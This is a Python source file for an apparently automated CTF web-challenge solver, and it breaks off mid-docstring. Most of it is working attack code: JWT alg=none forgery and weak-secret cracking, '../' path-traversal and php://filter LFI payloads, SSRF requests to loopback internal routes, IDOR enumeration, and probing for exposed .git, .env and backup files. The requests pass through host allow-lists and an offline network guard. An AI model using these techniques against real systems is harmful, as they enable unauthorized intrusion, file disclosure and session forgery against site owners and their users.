#!/usr/bin/env python3
"""Web-lane fast-win solver. The offline-deterministic part (works on a saved page/response/token, no network): pull flags
+ secrets out of HTML/JS/comments/hidden fields, decode base64 cookies/params, and fully analyse a JWT (decode, alg=none
forge, weak-HMAC crack, RS256->HS256 confusion). The live part probe(url) hits the common quick wins (robots/.git/flag/
source) only when a URL + requests are available. The recognizable fast wins land in seconds; a novel exploit goes to the agent.

  analyze(data, url=None) -> {flags, jwts, secrets, comments, hidden, notes}
  jwt_analyze(tok, secrets=None) -> {header, payload, weak_secret, forge_none}
  probe(url) -> dict  (live; needs requests)
"""
import base64, json, re, sys

FLAG = re.compile(r"(?i)\b(?:flag|huntress|ctf)\{[^}\n]{2,120}\}|\b[a-z]+-[a-z]+-[a-z]+-\d{2}\b")
JWT = re.compile(r"\beyJ[A-Za-z0-9_-]{6,}\.eyJ[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]*")
COMMENT = re.compile(r"<!--(.*?)-->", re.S)
HIDDEN = re.compile(r"""(?is)<input[^>]*type=['"]?hidden['"]?[^>]*>""")
SECRET = re.compile(r"""(?i)(api[_-]?key|secret|token|passwd|password|aws_?access_?key_?id|authorization)['"]?\s*[:=]\s*['"]?([A-Za-z0-9_\-\.=/+]{6,})""")
AWSKEY = re.compile(r"\b(AKIA[0-9A-Z]{16})\b")
WORDS = ["secret", "password", "key", "huntress", "flag", "admin", "changeit", "s3cr3t", "supersecret", "jwtsecret", "secretkey", "123456"]


def _b64url(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _b64url_dec(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def jwt_analyze(tok, secrets=None):
    out = {"token": tok[:40] + "...", "weak_secret": None, "forge_none": None, "forge_hs_from_rs": None}
    try:
        h, p, _sig = tok.split(".")
        out["header"] = json.loads(_b64url_dec(h))
        out["payload"] = json.loads(_b64url_dec(p))
    except Exception:
        return out
    # alg=none forge: elevate role/admin, empty signature (a classic web CTF win)
    pay = dict(out["payload"])
    for k in ("admin", "is_admin", "isAdmin"):
        if k in pay:
            pay[k] = True
    if "role" in pay:
        pay["role"] = "admin"
    nh = _b64url(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
    npy = _b64url(json.dumps(pay, separators=(",", ":")).encode())
    out["forge_none"] = "%s.%s." % (nh, npy)
    # weak HMAC secret (HS256): try a small wordlist
    if str(out.get("header", {}).get("alg", "")).upper().startswith("HS"):
        import hashlib
        import hmac as _hmac
        signing = tok.rsplit(".", 1)[0].encode()
        want = tok.rsplit(".", 1)[1]
        for w in (list(secrets) if secrets else []) + WORDS:
            sig = _b64url(_hmac.new(w.encode(), signing, hashlib.sha256).digest())
            if sig == want:
                out["weak_secret"] = w
                break
    return out


import contextlib, ipaddress, socket   # offline_guard (Oct-18 replay guard, copied unchanged from _commander_web\autosolve_web.py)

# OFFLINE GUARD (H5, 2026-10-18). The replay and prebrief path reads a SAVED fixture and must make no network call.
# While the guard is active, any socket connect, connect_ex or getaddrinfo to a non-loopback address raises
# OfflineNetworkError BEFORE the syscall, and the attempt is recorded in _GUARD_STATE["blocked"]. Loopback (127/8,
# ::1, localhost) stays allowed so local fixtures still work. Nested use is counted; the originals are restored on exit.
class OfflineNetworkError(RuntimeError):
    """A replay or prebrief tried to reach a non-loopback address."""


_GUARD_STATE = {"depth": 0, "saved": None, "blocked": []}


def _is_loopback(host):
    h = str(host).strip("[]").lower()
    if h == "localhost":
        return True
    try:
        return ipaddress.ip_address(h).is_loopback
    except ValueError:
        return False


@contextlib.contextmanager
def offline_guard():
    """Refuse every non-loopback network use for the duration of the block (see the H5 note above)."""
    st = _GUARD_STATE
    if st["depth"] == 0:
        real_connect, real_connect_ex, real_gai = socket.socket.connect, socket.socket.connect_ex, socket.getaddrinfo
        st["saved"] = (real_connect, real_connect_ex, real_gai)

        def _deny(what, host):
            st["blocked"].append("%s %r" % (what, host))
            raise OfflineNetworkError("offline replay refused %s to %r (non-loopback)" % (what, host))

        def _addr_host(addr):
            return addr[0] if isinstance(addr, tuple) and addr else addr

        def connect(self, addr):
            h = _addr_host(addr)
            if not (isinstance(h, str) and _is_loopback(h)):
                _deny("connect", h)
            return real_connect(self, addr)

        def connect_ex(self, addr):
            h = _addr_host(addr)
            if not (isinstance(h, str) and _is_loopback(h)):
                _deny("connect_ex", h)
            return real_connect_ex(self, addr)

        def getaddrinfo(host, *a, **k):
            if not (isinstance(host, str) and _is_loopback(host)):
                _deny("getaddrinfo", host)
            return real_gai(host, *a, **k)

        socket.socket.connect, socket.socket.connect_ex, socket.getaddrinfo = connect, connect_ex, getaddrinfo
    st["depth"] += 1
    try:
        yield st
    finally:
        st["depth"] -= 1
        if st["depth"] == 0:
            socket.socket.connect, socket.socket.connect_ex, socket.getaddrinfo = st["saved"]
            st["saved"] = None


def analyze(data, url=None):
    t = data.decode("latin-1", "ignore") if isinstance(data, (bytes, bytearray)) else data
    flags = list(dict.fromkeys(m.group(0) for m in FLAG.finditer(t)))
    comments = [c.strip()[:200] for c in COMMENT.findall(t) if c.strip()]
    for c in comments:                                   # a flag hidden in an HTML comment is the #1 web warmup
        flags += [m.group(0) for m in FLAG.finditer(c) if m.group(0) not in flags]
    jwts = [jwt_analyze(m.group(0)) for m in JWT.finditer(t)]
    secrets = [{"kind": m.group(1), "value": m.group(2)} for m in SECRET.finditer(t)]
    secrets += [{"kind": "aws_access_key_id", "value": m.group(1)} for m in AWSKEY.finditer(t)]
    hidden = HIDDEN.findall(t)[:10]
    notes = []
    if re.search(r"(?i)\{\{.*\}\}|\$\{.*\}", t):
        notes.append("template markers -> try SSTI ({{7*7}} / ${7*7})")
    if re.search(r"(?i)(select .* from|union select|sqlite_master|mysql)", t):
        notes.append("SQL surfaced -> try SQLi (sqlmap) on the parameter")
    return {"flags": flags, "jwts": jwts, "secrets": secrets, "comments": comments[:10], "hidden": hidden, "notes": notes}


COMMON_PATHS = ["robots.txt", "flag", "flag.txt", ".git/HEAD", ".env", "sitemap.xml", "admin", "index.php~", "backup.zip", "/api"]


def probe(url, timeout=10, allowed_hosts=None):
    """Live quick-win probe, SCOPE-ENFORCED (H5c; 2026-10-21 web_scope.py). Returns findings per common path, or {"refused": reason} BEFORE any request when the scope is not satisfied.
    allowed_hosts is an EXPLICIT allow-list of hosts (none -> refused: no scope means nothing is reachable); the target's host must be on it. The authorized origin is the target URL's own
    exact (scheme, host, port); malformed targets, non-http(s) schemes and URLs carrying credentials are refused. Redirects are never auto-followed: each hop is checked against the same origin
    before it is requested, so an in-scope URL cannot bounce the probe off-scope. Bounded requests and time; no credentials are sent. Pure standard library (no requests needed)."""
    import web_scope as _WSC
    allowed = [str(h).strip().lower() for h in (allowed_hosts or []) if str(h).strip()]
    if not allowed:
        return {"refused": "no target scope given (allowed_hosts is empty); refused"}
    try:
        scope = _WSC.Scope([url], max_requests=len(COMMON_PATHS) + 5, seconds=max(5.0, float(timeout) * (len(COMMON_PATHS) + 2)))
    except _WSC.ScopeError as e:
        return {"refused": "target refused: %s" % e}
    host = next(iter(scope.origins))[1]
    if host not in allowed:
        return {"refused": "target host %r is outside the allowed scope %s; refused" % (host, sorted(allowed))}
    out = {}
    base = url.rstrip("/")
    for path in COMMON_PATHS:
        u = base + "/" + path.lstrip("/")
        status, _h, text, _note = _WSC.scoped_get(u, scope, timeout=timeout)
        if status is not None and status < 400 and text:
            a = analyze(text, u)
            if a["flags"] or path in ("robots.txt", ".git/HEAD", ".env"):
                out[path] = {"status": status, "flags": a["flags"], "head": text[:200]}
    return out


def _members(blobs):
    """(name, bytes) for each blob and, when a blob is an archive, each of its members (AES-protected delivery archives, nested archives to depth 3, one gzip layer; bounded - see
    web_contracts.open_members). STATIC only - nothing is executed. 2026-10-21: this used plain zipfile, which cannot open the AES archives every real delivery is, so the static analysis
    saw ONE member (the raw blob) of 116-132 on a real delivery; the plain-zipfile reader below stays only as the fallback when web_contracts cannot be imported."""
    try:
        import web_contracts as WC
        mem, _notes = WC.open_members(blobs)
    except Exception:
        mem = None
    if mem is not None:
        for i, b in enumerate(blobs or []):
            if b:
                yield ("artifact_%d" % i, b)
        for m in mem:
            yield (m["path"], m["data"])
        return
    import io, zipfile
    for i, b in enumerate(blobs or []):
        if not b:
            continue
        yield ("artifact_%d" % i, b)
        if b[:2] == b"PK":
            try:
                z = zipfile.ZipFile(io.BytesIO(b))
                for n in z.namelist():
                    if n.endswith("/"):
                        continue
                    try:
                        yield (n, z.read(n))
                    except Exception:
                        pass
            except Exception:
                pass


def _declared_target(st):
    """The target URL the task declares: task['target'], else task['url'], else task['statement']['target'].
    Only an http(s) string counts; anything else is treated as no declared target (None)."""
    st = st or {}
    t = st.get("target") or st.get("url") or (st.get("statement") or {}).get("target")
    return t if (isinstance(t, str) and t.startswith("http")) else None


def _fast_wins(start, blobs, live=False):
    """Everything the deterministic layer can read from the delivered bytes + (optionally) a live target, WITHOUT
    executing any sample and WITHOUT guessing a field value: flags in the page/comments, JWT analysis, leaked secrets.
    Headless: a live probe runs only if the start carries an http(s) target and `requests` is importable."""
    found = {"flags": [], "secrets": [], "jwts": [], "notes": []}
    for _n, b in _members(blobs):
        a = analyze(b)
        for f in a["flags"]:
            if f not in found["flags"]:
                found["flags"].append(f)
        found["secrets"] += a["secrets"]
        found["jwts"] += a["jwts"]
        found["notes"] += [n for n in a["notes"] if n not in found["notes"]]
    st = start or {}
    target = _declared_target(st)
    # STATIC ONLY (2026-10-21): this function never makes a request. A live probe happens only through recognise_extra(live=True, allowed_hosts=...), which goes through the scope gate
    # (probe -> web_scope). Nothing in the automatic solving path can probe a target from here.
    if target and not live:
        found["notes"].append("declared target %s NOT probed (offline prebrief; a live probe needs recognise_extra(live=True) and an explicit allow-list)" % target)
    return found


# ============================================================================
# WEB SOLVER BATTERY (2026-10-20, Day 20 lesson "Stay in Your Directory"):
# Each released web target is one of many vuln classes (LFI, exposed backup,
# .git leak, directory listing, header/cookie leak). Mastery can bundle TWO
# different classes under one timer, so a single-pattern handler fails. The
# battery runs every technique concurrently per target; first proof wins.
# Read-only HTTPS GETs only, short timeouts, static-only (never executes a
# downloaded sample, never writes to the server).
# ============================================================================

_PROOF_RE = __import__("re").compile(r"proof_[0-9a-f]{32}")
_ARTICLE_RE = __import__("re").compile(r'<span class="pill">Document viewer</span>(.*?)</article>', __import__("re").S)
_TAG_RE = __import__("re").compile(r"<[^>]+>")

# Universal fallback file paths - try these on every LFI pattern regardless of the prompt
_LFI_UNIVERSAL_PATHS = [
    "/run/huntress/objective.txt",
    "/run/huntress/proof.txt",
    "/run/huntress/flag.txt",
    "/opt/huntress/objective.txt",
    "[local path]",
    "/flag",
    "/flag.txt",
    "/proof.txt",
    "/etc/huntress",
    "/tmp/objective.txt",
]

# Common quick-win paths probed concurrently on every target (direct GET)
_COMMON_WEB_PATHS = [
    "/robots.txt",
    "/sitemap.xml",
    "/.git/HEAD",
    "/.git/config",
    "/.env",
    "/.env.local",
    "/flag",
    "/flag.txt",
    "/proof",
    "/proof.txt",
    "/objective.txt",
    "/admin",
    "/admin/",
    "/debug",
    "/debug.json",
    "/status.json",
    "/api/flag",
    "/api/proof",
    "/api/debug",
    "/api/v1/debug",
    "/api/healthz",
    "/healthz",
    "/metrics",
    "/console",
    "/.htaccess",
    "/web.config",
    "/config.json",
    "/config.yaml",
    "/config.yml",
    "/settings.json",
    "/package.json",
    "/composer.json",
    "/server-status",
    "/phpinfo.php",
    "/info.php",
    "/.DS_Store",
    "/CHANGELOG.md",
    "/.svn/entries",
]

# Backup extensions to try on any discovered endpoint
_BACKUP_EXTS = [".bak", ".old", ".orig", ".swp", ".swo", "~", ".backup", ".save", ".tmp", ".copy", ".1", ".old.txt"]


def _http_get(url, timeout=6, max_bytes=524288):
    """One read-only GET, SCOPE-ENFORCED (2026-10-21, web_scope.py). Returns (status, headers_dict, body_text) or (None, {}, '') when refused or on any error.
    The URL must match an authorized origin registered by _solve_target for the target being solved (exact scheme, host and port); anything else - another host or port, a
    non-http scheme, credentials in the URL, an off-scope redirect hop - is refused before a socket is opened. Redirects are checked hop by hop, never auto-followed.
    Bounded body (512KiB), per-target request budget and deadline. Never raises. A 404/403 still returns its status and text."""
    import web_scope as _WSC
    status, hdrs, body, _note = _WSC.registered_get(url, timeout=timeout, max_bytes=max_bytes)
    if status is None:
        return None, {}, ""
    return status, hdrs, body


def _extract_proof(text, headers=None):
    """Find a proof_HEX anywhere in the text or in any header value. Returns the matched string, or None."""
    if text:
        m = _PROOF_RE.search(text)
        if m:
            return m.group(0)
    if headers:
        for k, v in headers.items():
            m = _PROOF_RE.search(str(v))
            if m:
                return m.group(0)
    return None


def _lfi_discover_viewer(base_url, timeout=6):
    """Find the viewer endpoint of a PHP-style LFI target. Returns a list of (viewer_path, param_name) candidates in
    priority order - the links on the root page come first; a hard-coded fallback set covers common CTF names.
    Follows a redirect from `/` automatically."""
    import re as _re
    base_url = base_url.rstrip("/") + "/"
    status, hdrs, body = _http_get(base_url)
    cands = []
    if status in (301, 302, 303, 307, 308):
        loc = hdrs.get("location", "")
        if loc.startswith("/"):
            _, _, body2 = _http_get(base_url.rstrip("/") + loc)
            body = body2 or body
    for m in _re.finditer(r'href="/([A-Za-z0-9_.-]+\.(?:php|aspx|jsp|cgi|do|action))\?([A-Za-z0-9_]+)=', body):
        pair = (m.group(1), m.group(2))
        if pair not in cands:
            cands.append(pair)
    # Hard fallback set from common CTF viewer names
    for v in ("reader.php", "notes.php", "view.php", "page.php", "doc.php", "include.php", "file.php", "index.php"):
        for p in ("doc", "page", "file", "name", "include", "path", "view"):
            if (v, p) not in cands:
                cands.append((v, p))
    return cands[:12]      # bounded


def _lfi_file_paths_from_prompt(prompt):
    """Parse every absolute file path from the prompt. Returns an ordered list, prompt-first then universals."""
    import re as _re
    paths = []
    for m in _re.finditer(r"(/[A-Za-z0-9_./-]+\.(?:txt|conf|cfg|ini|flag|log|json|yaml|yml|key))", str(prompt or "")):
        if m.group(1) not in paths:
            paths.append(m.group(1))
    # Also pick up barewords like /flag or /proof mentioned in the prompt (no extension)
    for m in _re.finditer(r"(?<!\w)(/(?:flag|proof|objective|secret)[A-Za-z0-9_/.-]*)", str(prompt or "")):
        if m.group(1) not in paths:
            paths.append(m.group(1))
    for p in _LFI_UNIVERSAL_PATHS:
        if p not in paths:
            paths.append(p)
    return paths


def _is_cancelled(cancel):
    return bool(cancel) and cancel.is_set()


def _fingerprint_php(target_url):
    """Quick check: does the target look like a PHP LFI candidate? True on a 'php' server header, '<link ... .css>' hints,
    or an explicit viewer link on the root. Keeps the LFI techniques from burning cycles on a Node target."""
    base = _base_origin(target_url) + "/"
    status, hdrs, body = _http_get(base, timeout=4)
    if status is None:
        return False
    hints = str(hdrs.get("x-powered-by", "")) + " " + str(hdrs.get("server", ""))
    if "php" in hints.lower():
        return True
    if body and __import__("re").search(r'href="/[A-Za-z0-9_.-]+\.(?:php|aspx|jsp|cgi)\?', body):
        return True
    # Follow one redirect
    if status in (301, 302, 303, 307, 308):
        loc = hdrs.get("location", "")
        if loc.startswith("/"):
            s2, h2, b2 = _http_get(base.rstrip("/") + loc, timeout=4)
            if "php" in (str(h2.get("x-powered-by", "")) + " " + str(h2.get("server", ""))).lower():
                return True
            if b2 and __import__("re").search(r'href="/[A-Za-z0-9_.-]+\.(?:php|aspx|jsp|cgi)\?', b2):
                return True
    return False



def _seg(v):
    """D32: a server-supplied id placed in a URL path is percent-encoded as ONE segment (`../x`, `a/b`, `?q` cannot re-route the
    request to another path of the target)."""
    import urllib.parse as _up
    return _up.quote(str(v), safe="")

def _technique_scope(target_url, seconds):
    """-> (scope, owned). D32: a technique charges the battery's shared per-target budget (web_scope.scope_for) instead of
    building a private Scope, which used to add a fresh budget per technique (zwesty post-mortem 4.2: up to 4x the intended
    requests on a multi-target ranked attempt). Standalone calls (no battery scope registered) still get their own, owned
    scope, registered here and unregistered by the caller only when owned."""
    import web_scope as _WSC
    shared = _WSC.scope_for(target_url.rstrip("/") + "/")
    if shared is not None:
        return shared, False
    sc = _WSC.Scope([target_url], seconds=seconds)
    _WSC.register(sc)
    return sc, True

def _tech_lfi_viewer(target_url, prompt, cancel=None):
    """TECHNIQUE 1: PHP/CGI-style LFI through a doc-including viewer. Fingerprint-gated to skip Node/static targets.
    Auto-discovers the viewer endpoint, tries each prompt file path (plus universal fallbacks) at depths 1..6. First
    proof_HEX hit (in the <article>-wrapped body or the raw page) wins. Honors `cancel` between every request so a
    sibling technique's win stops this one in ms."""
    import urllib.parse
    if _is_cancelled(cancel) or not _fingerprint_php(target_url):
        return None
    base = _base_origin(target_url) + "/"
    viewers = _lfi_discover_viewer(base)[:6]        # bounded; discovered-first ones are the real ones
    file_paths = _lfi_file_paths_from_prompt(prompt)[:8]
    for viewer, param in viewers:
        if _is_cancelled(cancel):
            return None
        for fp in file_paths:
            if _is_cancelled(cancel):
                return None
            rel = fp.lstrip("/")
            # LFI depth ladder (D27 audit, 2026-10-27): Forwarded Misgivings Mastery T4 needed depth=4;
            # the postmortem recommends 1..7 so viewers under /var/www/html/pages/ no longer get missed.
            for depth in range(1, 8):
                if _is_cancelled(cancel):
                    return None
                payload = "../" * depth + rel
                url = base + viewer + "?" + param + "=" + urllib.parse.quote(payload, safe="")
                status, hdrs, body = _http_get(url, timeout=4)
                if status is None or not body:
                    continue
                m = _ARTICLE_RE.search(body)
                scan = _TAG_RE.sub("", m.group(1)) if m else body
                p = _extract_proof(scan, hdrs)
                if p:
                    return p
    return None


def _tech_lfi_php_wrappers(target_url, prompt, cancel=None):
    """TECHNIQUE 2: PHP wrapper read (php://filter/convert.base64-encode/resource=<path>). Fingerprint-gated. Reads any
    .php file the viewer would include, base64-decodes any long block, scans for proof_HEX. Finds a hardcoded proof in
    the viewer's own source. Honors `cancel`."""
    import urllib.parse, base64
    if _is_cancelled(cancel) or not _fingerprint_php(target_url):
        return None
    base = _base_origin(target_url) + "/"
    viewers = _lfi_discover_viewer(base)[:4]
    for viewer, param in viewers:
        if _is_cancelled(cancel):
            return None
        for res in ("about.php", "index.php", "config.php", "secret.php", "flag.php", "proof.php", viewer):
            if _is_cancelled(cancel):
                return None
            payload = "php://filter/convert.base64-encode/resource=" + res
            url = base + viewer + "?" + param + "=" + urllib.parse.quote(payload, safe="")
            status, hdrs, body = _http_get(url, timeout=4)
            if status is None or not body:
                continue
            import re as _re
            for b64 in _re.findall(r"[A-Za-z0-9+/]{80,}={0,2}", body):
                try:
                    dec = base64.b64decode(b64, validate=False).decode("utf-8", "replace")
                except Exception:
                    continue
                p = _extract_proof(dec)
                if p:
                    return p
    return None


def _tech_robots_recon(target_url, prompt, cancel=None):
    """TECHNIQUE 3: robots.txt + exposed-backup recon. Fetches /robots.txt, follows every Disallow/Allow directory,
    scans each listing's hrefs, and tries backup-extension variants on the stems. The Day 20 MM Target 1 recipe."""
    import re as _re
    if _is_cancelled(cancel):
        return None
    base = _base_origin(target_url)
    status, _h, body = _http_get(base + "/robots.txt", timeout=4)
    if status != 200 or not body:
        return None
    p = _extract_proof(body)
    if p:
        return p
    dirs = _re.findall(r"(?im)^(?:Disallow|Allow):\s*(/\S*)", body)
    for d in dirs:
        if _is_cancelled(cancel):
            return None
        d = d.strip()
        if not d or d == "/":
            continue
        for suf in ("", "index.html", "index.php"):
            if _is_cancelled(cancel):
                return None
            u = base + d.rstrip("/") + "/" + suf
            s, _h2, body2 = _http_get(u, timeout=4)
            if not body2:
                continue
            p = _extract_proof(body2)
            if p:
                return p
            links = _re.findall(r'href="([^"]+)"', body2)
            for link in links:
                if _is_cancelled(cancel):
                    return None
                if link.startswith(("#", "mailto:", "javascript:", "/assets/", "/__arena/")) or link in ("/", "../"):
                    continue
                link_url = link if link.startswith("http") else (base + (link if link.startswith("/") else d.rstrip("/") + "/" + link))
                s3, h3, body3 = _http_get(link_url, timeout=4)
                p = _extract_proof(body3 or "", h3)
                if p:
                    return p
            for link in links:
                if _is_cancelled(cancel):
                    return None
                stem = link.rstrip("/").split("/")[-1]
                if "." not in stem:
                    continue
                root_stem = stem.rsplit(".", 1)[0]
                for ext in _BACKUP_EXTS:
                    if _is_cancelled(cancel):
                        return None
                    bu = base + d.rstrip("/") + "/" + root_stem + ext
                    s4, h4, body4 = _http_get(bu, timeout=3)
                    p = _extract_proof(body4 or "", h4)
                    if p:
                        return p
    return None


def _tech_common_paths(target_url, prompt, cancel=None):
    """TECHNIQUE 4: GET every common CTF path in parallel. Scans body and response headers for proof_HEX.
    D9 2026-10-24: the nested ThreadPoolExecutor now propagates the OWNER'S scope into every nested worker
    via web_scope.get_current_scope() + initializer. Without this, nested workers would start with an empty
    thread-local and scope_for() would fall back to the oldest-active registry entry, allowing cross-target
    scope borrow when two concurrent same-origin jobs are active. If no owning scope is bound (the technique
    was called outside _solve_target's executor-initializer path), the nested executor is NOT given a scope
    initializer and each inner worker calls _http_get() under the normal thread-local-absent / registry
    semantics — unchanged legacy behaviour. See web_scope v3 for the fail-closed scope_for rule."""
    from concurrent.futures import ThreadPoolExecutor, as_completed
    if _is_cancelled(cancel):
        return None
    base = _base_origin(target_url)

    def probe(path):
        if _is_cancelled(cancel):
            return None
        s, h, b = _http_get(base + path, timeout=4)
        if s is None:
            return None
        return _extract_proof(b or "", h)

    # D9 nested-scope fix + D11 FAIL-CLOSED: capture the owning scope from the OUTER worker's thread-local
    # and pass it as the nested executor's initializer so every nested worker thread binds the SAME scope.
    # D11 2026-10-24: if no bound scope is present, REFUSE the technique rather than launching unbound workers
    # that would fall through to the registry's oldest-active-wins fallback (cross-target borrow risk). A
    # caller that reaches _tech_common_paths without a bound scope is NOT a legitimate production path — the
    # outer _solve_target always binds via its ThreadPoolExecutor initializer. web_scope is imported locally
    # (same pattern as _http_get and _solve_target in this file).
    import web_scope as _WSC_local
    _owner_scope = _WSC_local.get_current_scope() if hasattr(_WSC_local, "get_current_scope") else None
    if _owner_scope is None:
        return None     # D11: no bound owning scope -> no network work; fail closed
    _kw = {"max_workers": 10, "initializer": _WSC_local.set_current_scope, "initargs": (_owner_scope,)}
    with ThreadPoolExecutor(**_kw) as ex:
        futs = [ex.submit(probe, p) for p in _COMMON_WEB_PATHS]
        for f in as_completed(futs):
            if _is_cancelled(cancel):
                for g in futs:
                    g.cancel()
                return None
            try:
                p = f.result()
            except Exception:
                p = None
            if p:
                for g in futs:
                    g.cancel()
                return p
    return None


def _tech_body_scan(target_url, prompt, cancel=None):
    """TECHNIQUE 5: scan the root response + headers + comments for proof_HEX. Lowest-cost win."""
    if _is_cancelled(cancel):
        return None
    base = _base_origin(target_url) + "/"
    status, hdrs, body = _http_get(base, timeout=4)
    if status in (301, 302, 303, 307, 308):
        loc = hdrs.get("location", "")
        if loc.startswith("/"):
            _, hdrs2, body2 = _http_get(base.rstrip("/") + loc, timeout=4)
            hdrs.update(hdrs2 or {})
            body = (body or "") + "\n" + (body2 or "")
    return _extract_proof(body or "", hdrs or {})


# Ordered battery of techniques - cheapest-first so the easy wins land in ms
class _ScopedSession:
    """The proof-recon ladder's transport inside the battery (D32: the SAME API as web_proof_recon._S - get/post/request/allow,
    cookie jar, per-call headers). Every request goes through web_scope (scope_for -> scoped_get/scoped_post): exact origin,
    the battery's shared per-target budget and deadline, redirects checked hop by hop. A refused or failed request yields
    (None, {}, b''). Before D32 this class had only get(url), so POST/header/cookie recognisers raised and were skipped."""
    def __init__(self, cancel=None):
        self._cancel = cancel                 # once a sibling technique has won (or the deadline passed) this session issues NO further request
        self._cookies = {}

    def allow(self, url):
        import web_scope as _WSC
        return _WSC.scope_for(url) is not None

    def _capture(self, hdrs):
        for k, v in (hdrs or {}).items():
            if str(k).lower() == "set-cookie" and v:
                part = str(v).split(";", 1)[0].strip()
                if "=" in part:
                    n, val = part.split("=", 1)
                    self._cookies[n.strip()] = val.strip()

    def _headers(self, extra):
        h = {}
        if self._cookies:
            h["Cookie"] = "; ".join("%s=%s" % kv for kv in self._cookies.items())
        items = extra.items() if isinstance(extra, dict) else (extra or [])
        for k, v in items:
            if k and v is not None:
                h[str(k)] = str(v)
        return h

    def get(self, url, extra_headers=None):
        if _is_cancelled(self._cancel):
            return None, {}, b""
        import web_scope as _WSC
        sc = _WSC.scope_for(url)
        if sc is None:
            return None, {}, b""
        st, hdrs, body, _note = _WSC.scoped_get(url, sc, timeout=6, max_bytes=524288, headers=self._headers(extra_headers) or None)
        if st is None:
            return None, {}, b""
        self._capture(hdrs)
        return st, hdrs, (body or "").encode("utf-8", "replace")

    def post(self, url, body=None, content_type="application/json", extra_headers=None, data=None, headers=None):
        if _is_cancelled(self._cancel):
            return None, {}, b""
        import json as _json
        import web_scope as _WSC
        import web_proof_recon as _WPR
        body, content_type, eh = _WPR._norm_post_args(body, data, headers, content_type, extra_headers)
        if isinstance(body, (dict, list)):
            body = _json.dumps(body)
        if isinstance(body, str):
            body = body.encode("utf-8", "ignore")
        sc = _WSC.scope_for(url)
        if sc is None:
            return None, {}, b""
        h = self._headers(eh)
        h["Content-Type"] = content_type
        st, hdrs, rb, _note = _WSC.scoped_post(url, body or b"", sc, timeout=6, max_bytes=524288, headers=h)
        if st is None:
            return None, {}, b""
        self._capture(hdrs)
        return st, hdrs, (rb or "").encode("utf-8", "replace")

    def request(self, method, url, data=None, headers=None):
        m = str(method or "GET").upper()
        if m == "GET":
            return self.get(url, extra_headers={k: v for k, v in (headers.items() if isinstance(headers, dict) else (headers or [])) if str(k).lower() != "content-type"})
        if m == "POST":
            return self.post(url, data=data, headers=headers)
        return None, {}, b""


def _tech_proof_recon(target_url, prompt, cancel=None):
    """TECHNIQUE 6 (2026-10-22): the eight generalised proof-recon GET methods (web_proof_recon.LADDER), run in order through the
    scoped session. Returns the proof string or None. Never raises."""
    if _is_cancelled(cancel):
        return None
    try:
        import web_proof_recon as _WPR
        return _WPR.recover(target_url.rstrip("/"), session=_ScopedSession(cancel))
    except Exception:
        return None


def _tech_ssrf_fetch_quest(target_url, prompt, cancel=None):
    """TECHNIQUE 7 (2026-10-24, Day 24 'Fetch Quest'): the ASP.NET Core Minimal API SSRF challenge. Workflow:
      1. GET /api/clues -> discover feature_route (SSRF fetcher) and secondary_route (internal-only path with proof).
      2. GET {feature_route}?url=http://127.0.0.1:8080/{secondary_route} -> body carries proof_HEX.
    Also tries a few common internal hostnames/ports in case the fixture ever varies them. Returns proof or None."""
    import re as _re, urllib.parse as _up, json as _json
    if _is_cancelled(cancel):
        return None
    base = _base_origin(target_url) + "/"
    status, _h, body = _http_get(base + "api/clues", timeout=5)
    if status != 200 or not body:
        return None
    try:
        info = _json.loads(body)
    except Exception:
        info = {}
    feature = info.get("feature_route") or info.get("fetch_route") or ""
    secondary = info.get("secondary_route") or info.get("internal_route") or ""
    if not feature or not secondary:
        # fall back: scrape any route-like path pair from the body
        pairs = _re.findall(r'"([a-z_]+_route)"\s*:\s*"(/[^"]+)"', body)
        d = dict(pairs)
        feature = feature or d.get("feature_route") or d.get("fetch_route") or ""
        secondary = secondary or d.get("secondary_route") or d.get("internal_route") or ""
    if not feature or not secondary:
        return None
    feature = feature if feature.startswith("/") else "/" + feature
    secondary = secondary if secondary.startswith("/") else "/" + secondary
    internals = [
        "http://127.0.0.1:8080", "http://localhost:8080",
        "http://127.0.0.1:5000", "http://localhost:5000",
        "http://127.0.0.1:80", "http://localhost",
        "http://127.0.0.1", "http://[::1]:8080", "http://[::1]",
    ]
    for host in internals:
        if _is_cancelled(cancel):
            return None
        probe = host + secondary
        url = base.rstrip("/") + feature + "?url=" + _up.quote(probe, safe="")
        s, h, b = _http_get(url, timeout=6)
        if s is None or not b:
            continue
        p = _extract_proof(b, h)
        if p:
            return p
    return None


def _tech_api_clues_inventory(target_url, prompt, cancel=None):
    """TECHNIQUE (2026-10-24, Day 24 'The API Has Opinions'): a server that advertises its own routes via /api/clues
    + /api/inventory and enforces a (fields, action) authorization matrix with gaps for a protected object id. Fetch
    the two advertisement endpoints, enumerate every (fields x action) combo against the protected_reference (and the
    public_reference as a fallback) at the discovered feature_route, keep the first 200 body carrying proof_HEX.
    No POST, no credentials, read-only GETs through _http_get (scope-enforced). Never raises."""
    import json as _json, itertools as _it, urllib.parse as _up
    if _is_cancelled(cancel):
        return None
    base = _base_origin(target_url)
    s, _h, body = _http_get(base + "/api/clues", timeout=4)
    if s != 200 or not body:
        return None
    try:
        clues = _json.loads(body)
    except Exception:
        return None
    feature_route = str(clues.get("feature_route") or "")
    inv_route = str(clues.get("inventory_route") or "/api/inventory")
    protected = clues.get("protected_reference")
    if not feature_route or protected is None:
        return None
    s2, _h2, body2 = _http_get(base + (inv_route if inv_route.startswith("/") else "/" + inv_route), timeout=4)
    if s2 != 200 or not body2:
        return None
    try:
        inv = _json.loads(body2)
    except Exception:
        return None
    fields = list(inv.get("fields") or [])
    actions = list(inv.get("actions") or [])
    public_ref = inv.get("public_reference")
    if not fields or not actions:
        return None
    ids_to_try = [protected] + ([public_ref] if public_ref is not None and public_ref != protected else [])
    field_combos = list(fields) + [",".join(c) for n in range(2, min(len(fields), 3) + 1) for c in _it.combinations(fields, n)]
    for oid in ids_to_try:
        for f in field_combos:
            for a in actions:
                if _is_cancelled(cancel):
                    return None
                qs = _up.urlencode({"id": oid, "fields": f, "action": a})
                url = base + (feature_route if feature_route.startswith("/") else "/" + feature_route) + "?" + qs
                st, hh, bb = _http_get(url, timeout=4)
                if st == 200 and bb:
                    p = _extract_proof(bb, hh)
                    if p:
                        return p
    return None


def _tech_reset_expectations(target_url, prompt, cancel=None):
    """TECHNIQUE (2026-10-25, Day 25 'Reset Expectations'): Symfony recovery flow that mints a reset token
    bound to a self-service account but trusts the account_id on redeem (token/account decoupling IDOR).
